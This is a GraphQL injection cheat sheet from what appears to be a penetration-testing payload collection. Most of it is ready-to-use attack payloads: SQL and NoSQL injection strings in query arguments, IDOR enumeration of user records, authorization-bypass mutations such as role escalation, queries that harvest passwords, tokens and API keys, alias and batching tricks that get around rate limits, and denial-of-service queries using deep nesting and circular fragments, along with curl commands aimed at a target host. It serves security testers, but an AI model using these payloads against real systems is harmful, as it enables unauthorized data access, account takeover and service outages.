# 📊 GraphQL Injection Cheatsheet

> **Review status:** Source verification pending. Confirm version-sensitive commands against the official documentation before use.

```
 ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║     
██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║     
██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║     
╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚══════╝
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🔍 GraphQL Basics

### Common Endpoints
```
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graph
/query
/gql
/playground
```

### Request Structure
```graphql
# Query
{
  user(id: 1) {
    name
    email
  }
}

# With operation name
query GetUser {
  user(id: 1) {
    name
  }
}

# Mutation
mutation {
  createUser(name: "test", email: "test@test.com") {
    id
    name
  }
}
```

---

## 🎯 Introspection Queries

### Full Schema Introspection
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Query Type (Entry Points)
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Mutation Type
```graphql
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### All Types
```graphql
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

### Specific Type Details
```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

---

## 💉 Injection Attacks

### SQL Injection via GraphQL
```graphql
# In arguments
{
  user(id: "1' OR '1'='1") {
    name
    email
    password
  }
}

# Union-based
{
  user(name: "' UNION SELECT username,password FROM users--") {
    name
  }
}
```

### NoSQL Injection
```graphql
{
  user(username: "{\"$ne\": null}") {
    name
    email
  }
}

# Or as JSON
{
  "query": "{ user(filter: {username: {$ne: \"\"}}) { name email } }"
}
```

### IDOR (Insecure Direct Object Reference)
```graphql
# Access other users' data
{
  user(id: 1) { name email password }
}
{
  user(id: 2) { name email password }
}
{
  user(id: 3) { name email password }
}

# Enumerate all users
{
  users {
    id
    name
    email
    role
  }
}
```

---

## 🔥 Authorization Bypass

### Missing Auth on Mutations
```graphql
# Try admin operations as regular user
mutation {
  deleteUser(id: 1) {
    success
  }
}

mutation {
  updateUserRole(id: 1, role: "admin") {
    id
    role
  }
}
```

### Nested Query Bypass
```graphql
# Access sensitive data through relationships
{
  posts {
    author {
      email
      passwordHash
      adminToken
    }
  }
}

{
  comments {
    user {
      privateMessages {
        content
      }
    }
  }
}
```

### Field Suggestion Abuse
```graphql
# If suggestions are enabled, try invalid fields
{
  user(id: 1) {
    passwor  # May suggest "password"
  }
}
```

---

## 🚀 Information Disclosure

### Debug Information
```graphql
# Error-based enumeration
{
  __typename
}

# Invalid query to get stack trace
{
  invalid_field_that_doesnt_exist
}
```

### Sensitive Field Discovery
```graphql
{
  user(id: 1) {
    id
    username
    email
    password
    passwordHash
    token
    apiKey
    secret
    privateKey
    ssn
    creditCard
    internalId
  }
}
```

---

## 🛡️ Bypass Techniques

### Alias-Based Bypass
```graphql
# Bypass rate limiting with aliases
{
  a: user(id: 1) { name }
  b: user(id: 2) { name }
  c: user(id: 3) { name }
  d: user(id: 4) { name }
}
```

### Batching Attacks
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

### Case Manipulation
```graphql
# Try different casing
{
  USER(id: 1) { name }
}
{
  User(id: 1) { name }
}
```

### Fragment Injection
```graphql
{
  user(id: 1) {
    ...sensitiveData
  }
}

fragment sensitiveData on User {
  password
  apiKey
  token
}
```

---

## 💣 DoS Attacks

### Deep Query Attack
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

### Circular Fragment
```graphql
query {
  user(id: 1) {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A  # Circular reference
}
```

### Large Result Set
```graphql
{
  users(first: 999999) {
    id
    name
    email
    posts {
      id
      comments {
        id
      }
    }
  }
}
```

---

## 🛠️ Testing Tools

### GraphQL Voyager
```bash
# Visualize schema
https://graphql-kit.com/graphql-voyager/
# Paste introspection result
```

### InQL (Burp Extension)
```
# Features:
- Schema extraction
- Query generation
- Vulnerability scanning
```

### graphql-cop
```bash
# Security audit tool
pip install graphql-cop
graphql-cop -t https://target.com/graphql
```

### graphw00f
```bash
# GraphQL fingerprinting
git clone https://github.com/dolevf/graphw00f
python3 main.py -t https://target.com/graphql
```

### Altair GraphQL Client
```
# Desktop client for testing
https://altairgraphql.dev/
```

---

## 📝 cURL Examples

### Basic Query
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { name email } }"}'
```

### With Variables
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query GetUser($id: Int!) { user(id: $id) { name } }", "variables": {"id": 1}}'
```

### Introspection
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

### With Auth
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ me { name } }"}'
```

---

## 📋 Testing Checklist

```markdown
## GraphQL Security Checklist

□ Identify GraphQL endpoints
□ Check introspection (schema extraction)
□ Extract all queries and mutations
□ Test IDOR on object queries
□ Test authorization on mutations
□ Check for SQL/NoSQL injection in arguments
□ Test nested queries for data leaks
□ Check rate limiting (alias bypass)
□ Test batch queries
□ Check for sensitive fields (password, token)
□ Test depth limiting (DoS)
□ Check for error disclosure
□ Test subscription endpoints
```

---

## 🔗 Common Vulnerabilities Summary

| Vulnerability | Test | Impact |
|---------------|------|--------|
| **Introspection Enabled** | Query `__schema` | Schema disclosure |
| **IDOR** | Change IDs in queries | Access other users' data |
| **Missing Auth** | Query without token | Unauthorized access |
| **SQLi/NoSQLi** | Inject in arguments | Database compromise |
| **Excessive Data** | Query sensitive fields | Data leak |
| **DoS** | Deep/circular queries | Service unavailable |
| **Batching Abuse** | Multiple queries | Rate limit bypass |

---

## 🔗 Related Payloads

- [SQLi Payloads](./SQLi.md)
- [NoSQL Injection](./NoSQL-Injection.md)
- [API Security](../API-Security/README.md)

---

**Back to Payloads:** [💉 Payloads Collection](./README.md)
